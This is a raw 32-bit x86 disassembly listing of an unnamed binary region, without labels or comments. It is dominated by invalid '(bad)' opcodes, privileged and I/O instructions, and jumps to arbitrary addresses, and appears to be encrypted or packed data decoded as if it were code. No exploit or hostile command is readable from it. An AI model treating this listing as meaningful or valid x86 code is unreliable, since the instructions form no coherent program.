  416f22:	add    eax,0x8fa0273
  416f27:	je     0x416f96
  416f29:	mov    ebx,0xdfbf5098
  416f2e:	add    DWORD PTR [edi+edi*8],0xffffffc1
  416f32:	mov    eax,ds:0xcb8591f3
  416f38:	ret    0x58f
  416f3b:	adc    al,0xc
  416f3d:	stc    
  416f3e:	fdiv   DWORD PTR [eax+esi*1]
  416f41:	jno    0x416f8c
  416f43:	imul   ebx,DWORD PTR [edi],0x6f6d950
  416f49:	push   ebx
  416f4a:	xor    dh,BYTE PTR [ebx-0x67]
  416f4d:	popf   
  416f4e:	imul   eax,ecx
  416f51:	add    esp,eax
  416f53:	xchg   edx,eax
  416f54:	push   eax
  416f55:	xor    ebx,ebx
  416f57:	mov    edx,esp
  416f59:	jmp    0x41723d
  416f5e:	cmp    al,0x58
  416f60:	push   esp
  416f61:	add    dh,BYTE PTR [edx+esi*1+0x4a]
  416f65:	data16 (bad) 
  416f68:	and    ch,cl
  416f6a:	sub    eax,0x37644086
  416f6f:	sbb    DWORD PTR [edi+0x70],edi
  416f72:	mov    ecx,0x9e70707e
  416f77:	mov    bh,0xd4
  416f79:	cdq    
  416f7a:	call   DWORD PTR [edi+esi*2+0x36]
  416f7e:	in     al,0xfb
  416f80:	sbb    DWORD PTR [ebx],esi
  416f82:	ret    
  416f83:	icebp  
  416f84:	test   DWORD PTR [ebx-0x3cc018e3],eax
  416f8a:	dec    esi
  416f8b:	call   0xd2615f51
  416f90:	imul   eax,edi,0xe813ba58
  416f96:	add    BYTE PTR [edi],dl
  416f98:	and    bl,dl
  416f9a:	(bad)  
  416f9b:	bound  esp,QWORD PTR [ecx-0x39b41ce0]
  416fa1:	push   edi
  416fa2:	or     BYTE PTR [eax+0x1505c5aa],al
  416fa8:	out    dx,al
  416fa9:	fdiv   QWORD PTR [esi+0x3e016016]
  416faf:	xor    esi,edx
  416fb1:	loope  0x416f53
  416fb3:	hlt    
  416fb4:	sbb    eax,0x899f25a2
  416fb9:	sbb    eax,0x63cad30e
  416fbe:	inc    edi
  416fbf:	mov    ?,ebp
  416fc1:	inc    edi
  416fc2:	fadd   st(6),st
  416fc4:	(bad)  
  416fc5:	cwde   
  416fc6:	test   al,0xa0
  416fc8:	addr16 pop ecx
  416fca:	jno    0x416fa8
  416fcc:	add    esi,DWORD PTR [ebp+0x52]
  416fcf:	inc    edx
  416fd0:	shl    BYTE PTR [ebp+edi*2+0x46],cl
  416fd4:	sub    DWORD PTR [esi+0x7],eax
  416fd7:	lods   eax,DWORD PTR ds:[esi]
  416fd8:	aaa    
  416fd9:	hlt    
  416fda:	leave  
  416fdb:	push   edi
  416fdc:	mov    ds:0x130f3b9,al
  416fe1:	cli    
  416fe2:	(bad)  
  416fe3:	push   eax
  416fe4:	adc    al,0x99
  416fe6:	loopne 0x416f8f
  416fe8:	mov    WORD PTR ds:0xa677202c,?
  416fee:	ins    DWORD PTR es:[edi],dx
  416fef:	or     al,al
  416ff1:	hlt    
  416ff2:	addr16 es icebp 
  416ff5:	mov    dh,0x76
  416ff7:	adc    ebx,DWORD PTR [edi-0x1]
  416ffa:	xlat   BYTE PTR ds:[ebx]
  416ffb:	fs cwde 
  416ffd:	stc    
  416ffe:	jne    0x417026
  417000:	push   es
  417001:	les    esi,FWORD PTR [edx+ebp*4+0x48]
  417005:	aaa    
  417006:	cmp    al,0x54
  417008:	and    DWORD PTR [ecx],esp
  41700a:	and    ecx,DWORD PTR [eax-0x7c]
  41700d:	aam    0x15
  41700f:	shr    DWORD PTR [esp+esi*1+0x59f7bb1e],1
  417016:	ds pop eax
  417018:	add    al,0x3
  41701a:	mov    DWORD PTR [esi-0x42],ebp
  41701d:	xor    bh,BYTE PTR fs:[edx-0x47348bc4]
  417024:	stos   BYTE PTR es:[edi],al
  417025:	fidivr DWORD PTR [eax]
  417027:	mov    bl,0xba
  417029:	dec    eax
  41702a:	retf   0xc5cf
  41702d:	jle    0x41706b
  41702f:	or     BYTE PTR [eax-0x68dd77b3],dh
  417035:	xchg   ecx,eax
  417036:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417037:	jle    0x41702d
  417039:	fist   DWORD PTR [ebx]
  41703b:	jmp    0x7d69b55b
  417040:	push   0x221e1ad9
  417045:	aad    0xbd
  417047:	fwait
  417048:	ss std 
  41704a:	daa    
  41704b:	adc    eax,DWORD PTR [edi]
  41704d:	mov    ds:0x3649b420,eax
  417052:	dec    ebp
  417053:	js     0x4170b5
  417055:	adc    al,0x12
  417057:	(bad)  
  417059:	mov    esp,0x75973e94
  41705e:	jae    0x416ff7
  417060:	or     eax,0xd76fda2f
  417065:	and    ecx,edi
  417067:	mov    eax,ds:0xf135b0bd
  41706c:	dec    esp
  41706d:	mov    ch,0xc9
  41706f:	adc    dl,al
  417071:	lods   eax,DWORD PTR ds:[esi]
  417072:	lahf   
  417073:	aaa    
  417074:	mov    eax,ds:0x3cd6667f
  417079:	repnz fdivr st(2),st
  41707c:	pop    ss
  41707d:	jle    0x417020
  41707f:	add    BYTE PTR [ecx+edx*2+0x410cd3b3],0x6a
  417087:	push   edi
  417088:	pop    edx
  417089:	mov    ds:0x52cf6f75,eax
  41708e:	mov    eax,0x6c61be86
  417093:	adc    eax,0x9991ef29
  417098:	mov    ebp,0x97745f3a
  41709d:	stos   DWORD PTR es:[edi],eax
  41709e:	mov    cl,0x2
  4170a0:	mov    edx,0xca63c882
  4170a5:	jle    0x4170ef
  4170a7:	addr16 jns 0x41711c
  4170aa:	or     edi,DWORD PTR [esi]
  4170ac:	icebp  
  4170ad:	add    BYTE PTR ds:0x5a230ec,bh
  4170b3:	stos   DWORD PTR es:[edi],eax
  4170b4:	loopne 0x417075
  4170b6:	fldenv [ecx+0x586add1]
  4170bc:	hlt    
  4170bd:	xchg   BYTE PTR fs:[ecx],cl
  4170c0:	pop    es
  4170c1:	xor    DWORD PTR [edx],esp
  4170c3:	sub    ch,BYTE PTR ds:0xcfbc75a9
  4170c9:	jo     0x4170bb
  4170cb:	rol    BYTE PTR [ecx],0x8c
  4170ce:	rcl    DWORD PTR [eax-0x8dd7dbb],1
  4170d4:	scas   eax,DWORD PTR es:[edi]
  4170d5:	dec    esi
  4170d6:	add    eax,0x2ab1dbb7
  4170db:	out    0xa4,al
  4170dd:	dec    esp
  4170de:	clc    
  4170df:	pop    ss
  4170e0:	shr    BYTE PTR [ecx+0x514900db],0x55
  4170e7:	loopne 0x41713e
  4170e9:	in     eax,0x43
  4170eb:	xchg   ebx,eax
  4170ec:	sub    DWORD PTR [esi+ecx*8-0x1787aab8],esp
  4170f3:	sub    ecx,DWORD PTR [ebp-0x2c558a32]
  4170f9:	jo     0x417120
  4170fb:	fcom   st(3)
  4170fd:	xchg   esp,eax
  4170fe:	pop    edx
  4170ff:	retf   0x7b8f
  417102:	iret   
  417103:	inc    edx
  417104:	mov    ebp,ecx
  417106:	out    0x85,eax
  417108:	popa   
  417109:	cmp    bl,BYTE PTR [eax+ecx*8-0x10097855]
  417110:	adc    al,0x6e
  417112:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417113:	(bad)  
  417114:	enter  0x81cf,0x34
  417118:	cdq    
  417119:	adc    eax,DWORD PTR [esi+0x48]
  41711c:	add    eax,0xabe8163e
  417121:	das    
  417122:	fmul   QWORD PTR [eax]
  417124:	ret    
  417125:	rcr    ecx,1
  417127:	clc    
  417128:	pop    edx
  417129:	pop    ecx
  41712a:	push   edi
  41712b:	adc    al,0x67
  41712d:	sbb    eax,0x41f3243b
  417132:	push   0x9
  417134:	call   0x8f3a1401
  417139:	pop    esi
  41713a:	neg    BYTE PTR [ecx+0x7a]
  41713d:	fcomp  QWORD PTR [eax+ebx*4-0x25]
  417141:	in     eax,dx
  417142:	stos   BYTE PTR es:[edi],al
  417143:	je     0x41718b
  417145:	pop    edi
  417146:	sub    ebx,DWORD PTR [edx]
  417148:	dec    eax
  417149:	cmp    al,0x7d
  41714b:	sub    eax,DWORD PTR [esi-0x74]
  41714e:	jmp    0xdb93:0xa3bcada4
  417155:	out    0xe5,al
  417157:	test   al,0xa0
  417159:	lods   al,BYTE PTR ds:[esi]
  41715a:	and    DWORD PTR [esi+0x4a],edi
  41715d:	lds    ebx,FWORD PTR [edx]
  41715f:	cdq    
  417160:	test   al,0x44
  417162:	outs   dx,BYTE PTR ds:[esi]
  417163:	jp     0x417184
  417165:	pop    es
  417166:	inc    ebp
  417167:	mov    esp,0xe8128d59
  41716c:	int3   
  41716d:	jno    0x41710f
  41716f:	and    BYTE PTR [edi],cl
  417171:	push   eax
  417172:	adc    al,0xf3
  417174:	adc    bl,cl
  417176:	das    
  417177:	push   0xffffffaa
  417179:	sub    esp,DWORD PTR [ebp+0xb9c3813]
  41717f:	sub    eax,0xd988cfe6
  417184:	pop    ebx
  417185:	loopne 0x41716f
  417187:	adc    BYTE PTR [edx],dh
  417189:	je     0x417191
  41718b:	add    DWORD PTR [esi-0x407a9f7b],edx
  417191:	pop    ds
  417192:	and    eax,0x7ec3124a
  417197:	push   es
  417198:	sbb    esi,DWORD PTR [esi+0x2d]
  41719b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41719c:	fistp  QWORD PTR [ecx-0x4e887ed5]
  4171a2:	imul   esi,DWORD PTR [ebx-0x1d],0xd545bcc1
  4171a9:	fbld   TBYTE PTR ds:0xdb22dbf8
  4171af:	call   FWORD PTR [ecx-0x11]
  4171b2:	xchg   ecx,eax
  4171b3:	les    ecx,FWORD PTR [edi]
  4171b5:	int    0x3
  4171b7:	test   DWORD PTR [ebp+0x118d2def],ecx
  4171bd:	xchg   edx,eax
  4171be:	jb     0x4171df
  4171c0:	loop   0x4171d8
  4171c2:	and    eax,0xa8b874e0
  4171c7:	call   0xbcb1:0x5f01ef89
  4171ce:	sub    DWORD PTR [edx+0x79a911c5],ecx
  4171d4:	inc    edi
  4171d5:	sub    eax,0x1e09cf28
  4171da:	je     0x4171d3
  4171dc:	push   es
  4171dd:	pop    ebx
  4171de:	je     0x41716d
  4171e0:	mov    ds:0xd6dc175b,al
  4171e5:	ja     0x4171fb
  4171e7:	shr    DWORD PTR [edx+0x65],1
  4171ea:	xchg   BYTE PTR [edi],cl
  4171ec:	mov    dl,0x17
  4171ee:	inc    esp
  4171ef:	retf   0x46df
  4171f2:	rol    DWORD PTR [ebp+0x6e],cl
  4171f5:	int3   
  4171f6:	or     BYTE PTR [eax],ch
  4171f8:	outs   dx,DWORD PTR ds:[esi]
  4171f9:	xchg   esp,eax
  4171fa:	mov    WORD PTR [edi-0x38],cs
  4171fd:	or     dh,BYTE PTR [edx-0x2591ae79]
  417203:	add    DWORD PTR [ebx],esp
  417205:	and    al,0xf0
  417207:	mov    esi,0x589d1fa3
  41720c:	mov    esp,0x15688698
  417211:	int3   
  417212:	pop    ebx
  417213:	jge    0x41724f
  417215:	icebp  
  417216:	and    al,dl
  417218:	pop    ebx
  417219:	fisub  WORD PTR [eax-0x69f70711]
  41721f:	popf   
  417220:	jb     0x417247
  417222:	mov    BYTE PTR [edx],ch
  417224:	out    dx,al
  417225:	push   ss
  417226:	xchg   esi,edx
  417228:	add    dl,0xe9
  41722b:	push   edx
  41722c:	or     eax,edi
  41722e:	aaa    
  41722f:	sub    eax,0x34bd379a
  417234:	cdq    
  417235:	xor    BYTE PTR [ebp+0x60],dh
  417238:	repz pop esi
  41723a:	arpl   WORD PTR ds:0x3434a6a,bp
  417240:	sbb    al,0x1a
  417242:	dec    ebx
  417243:	jmp    0x417527
  417248:	fsubrp st(0),st
  41724a:	(bad)  
  41724b:	stos   BYTE PTR es:[edi],al
  41724c:	mov    gs,WORD PTR [edx-0x16]
  41724f:	ins    BYTE PTR es:[edi],dx
  417250:	leave  
  417251:	pop    ebx
  417252:	sub    al,0x41
  417254:	mov    cl,0x33
  417256:	bts    DWORD PTR [eax+0x26],esi
  41725a:	jg     0x4172cc
  41725c:	mov    ecx,0xbb70707e
  417261:	mov    esi,0x747e9b27
  417266:	ret    
  417267:	retf   
  417268:	fidiv  WORD PTR ds:0xb6c38732
  41726e:	dec    ecx
  41726f:	fs xor esp,ecx
  417272:	cmp    eax,0x77619af4
  417277:	push   es
  417278:	xchg   esp,eax
  417279:	cmp    eax,edx
  41727b:	or     esp,DWORD PTR [esi]
  41727d:	or     DWORD PTR [esi],esi
  41727f:	mov    al,0xdc
  417281:	hlt    
  417282:	inc    edi
  417283:	enter  0x88f6,0xdd
  417287:	test   eax,0xc1d65fc3
  41728c:	jo     0x417307
  41728e:	stos   DWORD PTR es:[edi],eax
  41728f:	popf   
  417290:	or     al,0x85
  417292:	adc    bl,dh
  417294:	bound  ecx,QWORD PTR [eax-0x5c]
  417297:	mov    ebx,0x8adfd2cf
  41729c:	jne    0x41722f
  41729e:	pop    ss
  41729f:	sub    bh,al
  4172a1:	popf   
  4172a2:	pusha  
  4172a3:	mov    ds:0x647e7d26,al
  4172a8:	hlt    
  4172a9:	repz xor BYTE PTR [eax+0x14aa699e],dl
  4172b0:	es push es
  4172b2:	retf   
  4172b3:	aaa    
  4172b4:	sbb    BYTE PTR [eax+0x50],dh
  4172b7:	fwait
  4172b8:	cld    
  4172b9:	sbb    esp,DWORD PTR [edx-0x7]
  4172bc:	test   al,0xa3
  4172be:	popa   
  4172bf:	mov    ds:0x99fd3d17,al
  4172c4:	pop    esi
  4172c5:	adc    BYTE PTR [eax+ebx*1+0x5c],dl
  4172c9:	xchg   esp,eax
  4172ca:	push   ss
  4172cb:	repnz arpl WORD PTR [ecx-0x66df4f5b],cx
  4172d2:	push   es
  4172d3:	mov    esp,0xf8fa80e1
  4172d8:	xor    dh,BYTE PTR [edx]
  4172da:	adc    ah,BYTE PTR [ebx+0xe7b13e4]
  4172e0:	retf   0x4c41
  4172e3:	out    0xf,al
  4172e5:	(bad)  
  4172e6:	int3   
  4172e7:	stos   DWORD PTR es:[edi],eax
  4172e8:	jge    0x4172ff
  4172ea:	lock rcr BYTE PTR [ebx],0x77
  4172ee:	push   ebx
  4172ef:	and    eax,0x6eb127ba
  4172f4:	jns    0x417317
  4172f6:	imul   edi,edx,0xffffffa1
  4172f9:	cwde   
  4172fa:	sub    al,0x6f
  4172fc:	adc    DWORD PTR [edi],eax
  4172fe:	dec    ebx
  4172ff:	sbb    ebp,DWORD PTR ds:0xdd959bc
  417305:	fcomp  QWORD PTR es:[ebp+0x26cafb7]
  41730c:	mov    BYTE PTR [edx+0x1b],bl
  41730f:	out    dx,eax
  417310:	adc    DWORD PTR [edx-0x73],esi
  417313:	adc    ecx,DWORD PTR [ebx]
  417315:	fidiv  DWORD PTR [esi+ebx*4-0x65]
  417319:	sub    eax,0xfac8f381
  41731e:	cmp    dl,cl
  417320:	dec    esi
  417321:	ja     0x41734a
  417323:	cmp    BYTE PTR [ebx+0x7],bh
  417326:	inc    ebx
  417327:	or     DWORD PTR [eax-0x4810ac1b],esp
  41732d:	add    bh,BYTE PTR [ebx]
  41732f:	add    bl,BYTE PTR [edi]
  417331:	xor    BYTE PTR [eax-0x41d3a563],0xc3
  417338:	dec    edi
  417339:	push   es
  41733a:	mov    edi,0x3cb40af
  41733f:	xor    ecx,DWORD PTR [ebp-0x3f]
  417342:	and    ebx,DWORD PTR [ecx]
  417344:	inc    eax
  417345:	jno    0x4172f9
  417347:	xor    al,0xe9
  417349:	dec    esi
  41734a:	fisttp DWORD PTR [edx*1+0x7c8da223]
  417351:	das    
  417352:	shl    BYTE PTR [edi],cl
  417354:	dec    edx
  417355:	jns    0x4172f0
  417357:	inc    ecx
  417358:	scas   al,BYTE PTR es:[edi]
  417359:	or     al,0x71
  41735b:	data16 jl 0x417339
  41735e:	push   0x4a
  417360:	push   esp
  417361:	idiv   BYTE PTR [eax+0x5401d75a]
  417367:	push   ds
  417368:	outs   dx,DWORD PTR ds:[esi]
  417369:	test   BYTE PTR [ecx+0x637d8db0],ah
  41736f:	in     eax,dx
  417370:	test   ch,ah
  417372:	sub    ah,BYTE PTR [ebx+0x61]
  417375:	jmp    0x417319
  417377:	mov    dh,ch
  417379:	addr16 inc ebp
  41737b:	push   esp
  41737c:	ret    0x2e46
  41737f:	and    dl,0xb3
  417382:	add    dl,BYTE PTR cs:[edi+0x76778a08]
  417389:	adc    BYTE PTR [esi],bl
  41738b:	sub    eax,0x6cb1eed3
  417390:	push   ecx
  417391:	loopne 0x4173a6
  417393:	jbe    0x4173b7
  417395:	pop    ebp
  417396:	in     al,dx
  417397:	sub    BYTE PTR [edi-0x42e47a33],al
  41739d:	test   al,0xd3
  41739f:	retf   0xf2ad
  4173a2:	hlt    
  4173a3:	out    0x96,al
  4173a5:	mov    ds:0x7cd25246,al
  4173aa:	shr    DWORD PTR [esi],1
  4173ac:	fcomp  DWORD PTR [ebp+edi*4-0x20b14977]
  4173b3:	test   al,0x90
  4173b5:	push   edi
  4173b6:	out    0x22,al
  4173b8:	push   edi
  4173b9:	jb     0x417436
  4173bb:	cdq    
  4173bc:	inc    edx
  4173bd:	push   esi
  4173be:	push   eax
  4173bf:	adc    ebx,DWORD PTR [eax+0x61a58802]
  4173c5:	outs   dx,DWORD PTR ds:[esi]
  4173c6:	repz mov ss,WORD PTR [ebx+0x44]
  4173ca:	test   BYTE PTR [ebx+0x3a],bh
  4173cd:	(bad)  
  4173ce:	fsub   QWORD PTR [edx*8+0x71337a05]
  4173d5:	cdq    
  4173d6:	push   ecx
  4173d7:	xchg   DWORD PTR [edi+0x36],edx
  4173da:	ror    BYTE PTR [esi],cl
  4173dc:	lds    esi,FWORD PTR [ebx+eax*2+0x40]
  4173e0:	adc    eax,DWORD PTR [esi-0x6c18153e]
  4173e6:	inc    edx
  4173e7:	iret   
  4173e8:	sbb    ebx,edx
  4173ea:	mov    edi,0x77eeeb75
  4173ef:	repnz clc 
  4173f1:	lds    esp,FWORD PTR [ecx]
  4173f3:	enter  0xda9b,0xfb
  4173f7:	sub    al,0x31
  4173f9:	add    DWORD PTR [edi+0x5ac60d4e],edi
  4173ff:	loopne 0x417435
  417401:	push   0x6b
  417403:	jecxz  0x417429
  417405:	call   0xacae0cd1
  41740a:	rcl    DWORD PTR [edi],cl
  41740c:	sub    DWORD PTR [ecx],0xc09798e9
  417412:	(bad)  
  417413:	mov    al,0xe4
  417415:	gs (bad) 
  417417:	jmp    0x159a:0x80bda238
  41741e:	sbb    dl,BYTE PTR ds:0xe0c2152
  417424:	mov    al,ds:0xd92e4869
  417429:	sahf   
  41742a:	aam    0x51
  41742c:	push   edx
  41742d:	sub    eax,0x61
  417430:	gs faddp st(1),st
  417433:	inc    ebp
  417434:	mov    ds:0xb9642da8,eax
  417439:	and    eax,0xa49c070e
  41743e:	aas    
  41743f:	out    0xa5,eax
  417441:	xor    al,0xec
  417443:	rcl    BYTE PTR [eax],cl
  417445:	sub    cl,BYTE PTR [ebx-0x5b]
  417448:	std    
  417449:	(bad)  
  41744a:	arpl   ax,bx
  41744c:	pop    ebp
  41744d:	in     al,0xb2
  41744f:	mov    gs:0x4400bbe7,eax
  417455:	fidivr DWORD PTR [ebx+0xc]
  417458:	loop   0x41744e
  41745a:	cwde   
  41745b:	cs (bad) 
  41745d:	adc    BYTE PTR [edi+0x53d25f48],bh
  417463:	lea    edi,[esi-0x67170234]
  417469:	jecxz  0x41747c
  41746b:	test   eax,0x35b54aae
  417470:	push   0x939bdc24
  417475:	mov    ch,BYTE PTR [edx+0x35d45441]
  41747b:	mov    ecx,0xeef774a0
  417480:	rcl    DWORD PTR [edx],cl
  417482:	rol    BYTE PTR [ecx-0x2c],0xc
  417486:	mov    dl,BYTE PTR [esi-0x683ab41c]
  41748c:	clc    
  41748d:	inc    esp
  41748e:	aaa    
  41748f:	dec    ebp
  417490:	std    
  417491:	pop    edi
  417492:	adc    cl,0x13
  417495:	aam    0xd4
  417497:	add    DWORD PTR [esi],eax
  417499:	mov    dl,0xc9
  41749b:	jl     0x417466
  41749d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41749e:	not    DWORD PTR [edi+0x2a90a57c]
  4174a4:	(bad)  
  4174a5:	jmp    0x4174d2
  4174a7:	cmp    al,0xc7
  4174a9:	nop
  4174aa:	xchg   DWORD PTR [edi+0x102c408d],esp
  4174b0:	rcl    BYTE PTR [ebp-0x6e],cl
  4174b3:	stc    
  4174b4:	leave  
  4174b5:	pop    esp
  4174b6:	and    BYTE PTR [ebx],ah
  4174b8:	in     eax,dx
  4174b9:	loop   0x417451
  4174bb:	mov    BYTE PTR [esi+0x964f810],0x1c
  4174c2:	inc    ecx
  4174c3:	inc    esi
  4174c4:	cmp    DWORD PTR ds:0x7c9902b5,edx
  4174ca:	dec    esp
  4174cb:	pop    ecx
  4174cc:	fnsave [eax+eax*8-0x10]
  4174d0:	xor    BYTE PTR [ecx-0x65248326],dl
  4174d6:	out    dx,al
  4174d7:	lahf   
  4174d8:	jne    0x4174ab
  4174da:	or     bl,dh
  4174dc:	adc    ah,cl
  4174de:	jo     0x41755a
  4174e0:	mov    BYTE PTR [edi],dl
  4174e2:	addr16 mov al,0x9e
  4174e5:	push   eax
  4174e6:	out    dx,al
  4174e7:	mov    ds:0x5a84af56,eax
  4174ec:	repz xor eax,0xea286ac3
  4174f2:	mov    dh,0x9f
  4174f4:	push   ebp
  4174f5:	mov    edi,0x12419621
  4174fa:	rcr    BYTE PTR [edx+0x1db943b7],0x40
  417501:	mov    ebp,0xf52e2156
  417506:	sbb    BYTE PTR [edx-0x2e],ah
  417509:	pusha  
  41750a:	and    ebp,ebx
  41750c:	retf   
  41750d:	push   ss
  41750e:	cmc    
  41750f:	inc    ebx
  417510:	push   0xf00f32ba
  417515:	mov    esp,0xa89eb91f
  41751a:	(bad)  
  41751b:	(bad)  
  41751c:	sub    al,0xf3
  41751e:	aaa    
  41751f:	test   al,0x73
  417521:	sub    eax,DWORD PTR [edx-0x7806008f]
  417527:	xor    edx,edx
  417529:	add    DWORD PTR [ebp-0xc],ebx
  41752c:	pop    ebx
  41752d:	mov    eax,DWORD PTR [ebp-0xc]
  417530:	pop    edi
  417531:	jmp    0x417815
  417536:	cld    
  417537:	pop    esi
  417538:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417539:	addr16 popa 
  41753b:	gs mov esp,0x68365a61
  417541:	mov    DWORD PTR [edx+ecx*1+0x24b9012b],edx
  417548:	jg     0x4175ba
  41754a:	mov    ecx,0xfb70707e
  41754f:	adc    bl,bh
  417551:	jl     0x4175c8
  417553:	out    0x29,al
  417555:	jge    0x4175c9
  417557:	dec    esi
  417558:	in     eax,dx
  417559:	jl     0x41752a
  41755b:	popf   
  41755c:	rcr    dl,1
  41755e:	aas    
  41755f:	int3   
  417560:	sbb    eax,DWORD PTR [esi+0x78b38e7e]
  417566:	std    
  417567:	push   0xffffff9b
  417569:	retf   
  41756a:	jae    0x41752e
  41756c:	push   ecx
  41756d:	rol    esp,1
  41756f:	ss cli 
  417571:	sub    edi,esp
  417573:	jge    0x4175c0
  417575:	dec    esi
  417576:	fidiv  WORD PTR [eax-0x4b]
  417579:	push   eax
  41757a:	dec    ecx
  41757b:	xchg   edx,edi
  41757d:	add    eax,0x43097158
  417582:	in     eax,dx
  417583:	aam    0x31
  417585:	shr    DWORD PTR ds:0x4fabe23a,0xed
  41758c:	dec    ebx
  41758d:	push   edi
  41758e:	ss or  eax,0x9bd0f1ae
  417594:	pushf  
  417595:	xor    esi,esp
  417597:	fimul  WORD PTR [esi+eax*2]
  41759a:	ins    BYTE PTR es:[edi],dx
  41759b:	dec    esi
  41759c:	dec    esi
  41759d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41759e:	push   di
  4175a0:	push   esp
  4175a1:	adc    DWORD PTR [ecx-0x7a],edx
  4175a4:	mov    bl,0xc4
  4175a6:	jo     0x4175c1
  4175a8:	jp     0x41759a
  4175aa:	jl     0x4175f6
  4175ac:	(bad)  
  4175ad:	stc    
  4175ae:	popf   
  4175af:	mov    al,ds:0xf84894ab
  4175b4:	fisttp WORD PTR [esi+0xb]
  4175b7:	mov    dh,0xb
  4175b9:	mov    ds:0x5d406600,eax
  4175be:	popa   
  4175bf:	test   eax,0xa4ccd988
  4175c4:	inc    esi
  4175c5:	fimul  WORD PTR [ebx+0x1b]
  4175c8:	xor    DWORD PTR ds:0xd3eb56eb,edx
  4175ce:	sbb    BYTE PTR [eax],dh
  4175d0:	jmp    0x44ce:0xbb6e50b9
  4175d7:	and    DWORD PTR [eax+edx*4-0x15f8d824],ebx
  4175de:	rcl    esi,0xa6
  4175e1:	mov    ds:0x5843b21b,al
  4175e6:	addr16 dec edi
  4175e8:	leave  
  4175e9:	xor    eax,0x3201294
  4175ee:	mov    ecx,0xb56d6b19
  4175f3:	jmp    0xf4ac7cb
  4175f8:	mov    ds:0xdaa5bf2d,eax
  4175fd:	daa    
  4175fe:	lahf   
  4175ff:	inc    eax
  417600:	lods   eax,DWORD PTR ds:[esi]
  417601:	das    
  417602:	fisubr DWORD PTR cs:[edx-0x22]
  417606:	sbb    al,al
  417608:	pop    ebp
  417609:	xor    ah,BYTE PTR [eax]
  41760b:	jmp    0x417601
  41760d:	pop    esi
  41760e:	js     0x417598
  417610:	and    BYTE PTR [ebx+0x5d],bl
  417613:	jmp    0x2220:0x9170872b
  41761a:	in     al,0x4d
  41761c:	shl    DWORD PTR [edx-0x33d1d2b],0x69
  417623:	push   edx
  417624:	out    dx,eax
  417625:	mov    eax,ds:0x6d055fd8
  41762a:	(bad)  
  41762e:	push   ecx
  41762f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417630:	dec    ebp
  417631:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417632:	pxor   mm3,QWORD PTR [esi]
  417635:	(bad)  
  417636:	xchg   ecx,eax
  417637:	push   ss
  417638:	mov    dl,0x94
  41763a:	or     BYTE PTR [esi-0x2f35afaf],dl
  417640:	add    BYTE PTR [ebp-0x5f],ah
  417643:	push   edi
  417644:	(bad)  
  417645:	ss jno 0x4176b3
  417648:	adc    DWORD PTR [ecx],0x64fc227a
  41764e:	and    ecx,ebx
  417650:	push   ss
  417651:	jo     0x4176c9
  417653:	jge    0x417692
  417655:	ret    
  417656:	cmp    esp,DWORD PTR [esi+esi*2-0x76]
  41765a:	stc    
  41765b:	inc    ebx
  41765c:	nop
  41765d:	pop    ss
  41765e:	xchg   ebp,eax
  41765f:	iret   
  417660:	add    BYTE PTR [edx+0x3725a91b],dl
  417666:	(bad)  
  417667:	push   ds
  417668:	call   0x34ed:0x4567ca45
  41766f:	add    DWORD PTR [edx-0x1132c84a],esp
  417675:	mov    eax,ds:0x65b09011
  41767a:	dec    edi
  41767b:	mov    ebx,DWORD PTR [ebx]
  41767d:	or     DWORD PTR [edx+0x4b],esp
  417680:	jg     0x4176e8
  417682:	bound  edx,QWORD PTR [ebp+0x21013330]
  417688:	xlat   BYTE PTR gs:[ebx]
  41768a:	jo     0x4176ce
  41768c:	dec    esp
  41768d:	aad    0xf3
  41768f:	popf   
  417690:	fs daa 
  417692:	and    eax,0xeb14618d
  417697:	fidivr DWORD PTR [ebx]
  417699:	int3   
  41769a:	or     al,0x6b
  41769c:	jne    0x417629
  41769e:	mov    edx,0x4838d37c
  4176a3:	cmp    al,0x60
  4176a5:	ins    BYTE PTR es:[edi],dx
  4176a6:	push   ebx
  4176a7:	dec    ecx
  4176a8:	cs (bad) 
  4176ab:	pop    ebp
  4176ac:	call   DWORD PTR [edi+0x59]
  4176af:	inc    edx
  4176b0:	fisttp WORD PTR [edi-0x47]
  4176b3:	pop    edi
  4176b4:	cmp    eax,0x54f7d1ec
  4176b9:	jp     0x417643
  4176bb:	or     DWORD PTR [ebp+0x7e55f6c0],0x3f8d587b
  4176c5:	ja     0x4176b8
  4176c7:	dec    DWORD PTR [esi-0x3d]
  4176ca:	and    dl,BYTE PTR [eax+0x2f]
  4176cd:	retf   
  4176ce:	cmp    BYTE PTR [ebp+0x7c],bl
  4176d1:	xchg   ebp,edi
  4176d3:	mov    bh,0xb6
  4176d5:	(bad)  
  4176d6:	(bad)  
  4176d7:	xor    al,0x32
  4176d9:	pushf  
  4176da:	fst    DWORD PTR [ebp+0x73]
  4176dd:	out    dx,al
  4176de:	sbb    eax,0xf3ff5a2b
  4176e3:	sbb    al,0xe3
  4176e5:	jo     0x417759
  4176e7:	std    
  4176e8:	jl     0x4176a1
  4176ea:	je     0x4176e7
  4176ec:	xor    al,0x27
  4176ee:	int    0xbe
  4176f0:	test   eax,ebx
  4176f2:	mov    DWORD PTR [esi],eax
  4176f4:	rcr    DWORD PTR [ebx-0x30c693f1],1
  4176fa:	pop    esi
  4176fb:	sbb    al,0x80
  4176fd:	retf   
  4176fe:	sbb    BYTE PTR [edi+eax*8-0x472fb831],cl
  417705:	out    dx,al
  417706:	imul   edi,DWORD PTR [esp+ebp*1+0x6606a41e],0x3c
  41770e:	adc    eax,0x7f63c620
  417713:	das    
  417714:	sub    eax,0x98a2e503
  417719:	dec    edi
  41771a:	pop    edi
  41771b:	push   es
  41771c:	xlat   BYTE PTR ds:[ebx]
  41771d:	arpl   WORD PTR [eax],cx
  41771f:	mov    WORD PTR [edi+eax*4-0x34],es
  417723:	stos   BYTE PTR es:[edi],al
  417724:	stos   BYTE PTR es:[edi],al
  417725:	cdq    
  417726:	out    0x34,eax
  417728:	push   ebp
  417729:	ret    
  41772a:	jo     0x4176f4
  41772c:	stc    
  41772d:	jg     0x4177a9
  41772f:	cmp    al,0xab
  417731:	mov    dh,0x17
  417733:	jno    0x4176b8
  417735:	mov    eax,ds:0xce3c528
  41773a:	mov    ch,0xe4
  41773c:	pop    ebx
  41773d:	mov    al,ds:0x1c6e66d8
  417742:	mov    esp,0xa62898e0
